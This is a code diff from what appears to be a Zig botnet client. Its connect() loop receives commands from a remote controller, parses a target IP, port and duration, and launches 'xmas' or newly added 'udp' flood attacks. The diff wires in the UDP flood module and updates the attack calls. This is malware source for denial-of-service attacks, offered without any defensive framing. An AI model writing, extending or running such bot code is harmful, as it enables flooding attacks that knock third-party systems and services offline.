@@ -12,6 +12,7 @@ var gpa = std.heap.GeneralPurposeAllocator(.{}){};
 const allocator = gpa.allocator();
 
 const xmas = @import("attack/xmas.zig");
+const udp = @import("attack/udp.zig");
 
 const Killer = @import("Killer.zig");
 const conf = @import("conf.zig");
@@ -84,11 +85,6 @@ pub fn connect() !void {
         var buf: [1024]u8 = undefined;
 
         while (true) {
-            // const n = helpers.recvfrom(@intCast(fd), &buf, buf.len, linux.MSG.NOSIGNAL, null, null) catch |err| {
-            //     std.debug.print("recv err: {s}\n", .{@errorName(err)});
-            //     continue;
-            // };
-
             const n = helpers.recvfrom(@intCast(fd), &buf, buf.len, 0, null, null) catch |err| {
                 std.debug.print("recv err: {s}\n", .{@errorName(err)});
                 continue;
@@ -120,7 +116,10 @@ pub fn connect() !void {
             const duration = std.fmt.parseInt(u16, it.next().?, 10) catch unreachable;
 
             if (std.mem.eql(u8, cmd, "xmas")) {
-                xmas.xmas(ip, port, duration);
+                xmas.xmas(allocator, ip, port, duration);
+            }
+            if (std.mem.eql(u8, cmd, "udp")) {
+                udp.udp(allocator, ip, port, duration);
             }
         }
     }
